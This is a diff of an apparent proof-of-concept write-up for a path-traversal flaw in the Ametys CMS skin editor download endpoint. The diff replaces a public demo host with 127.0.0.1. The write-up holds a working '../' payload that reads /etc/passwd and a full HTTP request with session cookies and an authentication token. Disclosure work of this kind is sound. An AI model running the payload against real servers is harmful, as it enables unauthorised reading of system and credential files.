@@ -13,20 +13,20 @@
 #### Exploit working with manager , webmaster and admin cred 
 1. Login with webmaster cred 
 2. Click Skin Editor > Resources > Img > any image file
-> https://demo.ametys.org/cms/plugins/skineditor/file/download?path=../../../../../../../../../../../../../../../../etc/passwd&skinName=demo
+> https://127.0.0.1/cms/plugins/skineditor/file/download?path=../../../../../../../../../../../../../../../../etc/passwd&skinName=demo
 4. Catch to request with burp suite , change path with lfi payload 
 
 ### Request:
 
 ```http
 GET /cms/plugins/skineditor/file/download?path=../../../../../../../../../../../../../../../../etc/passwd&skinName=demo HTTP/1.1
-Host: demo.ametys.org
+Host: 127.0.0.1
 Cookie: JSESSIONID=3F87581AEF2EC304640A09D7094D98EE; AmetysAuthentication=YW1ldHlzX2RlbW9fdXNlcnMjd2VibWFzdGVyI05ycnY0RlVPeXgwcENOVEk; tarteaucitron=!gajs=false!matomocloud=false!googlemaps=false!gagenda=false!sharethis=false!dailymotion=false!youtube=false!youtubeplaylist=false; JSESSIONID=DC788DBC176BFB0787DA25FC2C93CE63; _pk_id.2.afd3=4f757134bce0bed6.1754326045.; _ga_2VTM1RYFX8=GS2.1.s1754331048$o1$g1$t1754331054$j54$l0$h0; JSESSIONID-Ametys=719D9B1BA49FE4046DFB966F28FBB385
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
-Referer: https://demo.ametys.org/cms/www/index.html
+Referer: https://127.0.0.1/cms/www/index.html
 Dnt: 1
 Sec-Gpc: 1
 Upgrade-Insecure-Requests: 1
